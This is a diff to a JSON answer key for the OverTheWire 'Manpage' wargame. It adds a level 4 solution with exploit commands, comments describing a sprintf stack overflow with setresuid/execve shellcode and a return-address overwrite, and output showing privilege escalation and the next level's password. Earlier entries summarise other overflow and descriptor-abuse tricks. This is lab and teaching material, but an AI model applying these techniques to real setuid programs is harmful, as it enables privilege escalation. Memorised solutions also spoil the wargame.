@@ -3,7 +3,8 @@
   "0": "Overflow the strcpy in the setuid /manpage/manpage0 binary and recover manpage1's privileges via the saved set-user-ID to read its password file.",
   "1": "Overflow strcpy in /manpage/manpage1 despite its strlen check that raises SIGTERM after the copy.",
   "2": "Defeat the getpass checker in /manpage/manpage2, abusing its argv[0] re-exec and an inherited open password-file descriptor.",
-  "3": "Match a 256-byte random password compared with strcmp in /manpage/manpage3, exploiting strcmp's stop-at-NUL semantics."
+  "3": "Match a 256-byte random password compared with strcmp in /manpage/manpage3, exploiting strcmp's stop-at-NUL semantics.",
+  "4": "Win the seeded Wumpus game in /manpage/manpage4 and abuse log_winner's unbounded sprintf over its uninitialized firstname/lastname buffers to return into shellcode copied into its own frame."
  },
  "host": "manpage.labs.overthewire.org",
  "levels": [
@@ -76,6 +77,26 @@
    ],
    "pw": "8O96CWQPaN",
    "user": "manpage3"
+  },
+  {
+   "cmds": [
+    [
+     "cat /manpage/manpage4.diff   # patched Wumpus: log_winner() sprintf's ctime+firstname+lastname (uninitialized 256B name buffers) into buf[256]",
+     "python3 exp4g.py /manpage/manpage4",
+     "# seed -s 12345: replicate host libc rand() -> layout player=18 wumpus=13 pits={2,16} bats={5,3}; move 18->19->20, shoot 1 room: 13",
+     "# the ROOM # line persists in getnum's stack buffer overlapping the name buffers: NOP sled + setresuid(17005)+execve shellcode inside the lastname span, saved-RET dword = &buf+64; answer 'AAAA' at the name prompt",
+     "id",
+     "cat /etc/manpage_pass/manpage5"
+    ]
+   ],
+   "lvl": 4,
+   "out": [
+    "AHA! YOU GOT THE WUMPUS!",
+    "uid=17005(manpage5) gid=17004(manpage4) groups=17004(manpage4)",
+    "v2ltdizZfm"
+   ],
+   "pw": "v2ltdizZfm",
+   "user": "manpage4"
   }
  ],
  "title": "Manpage"
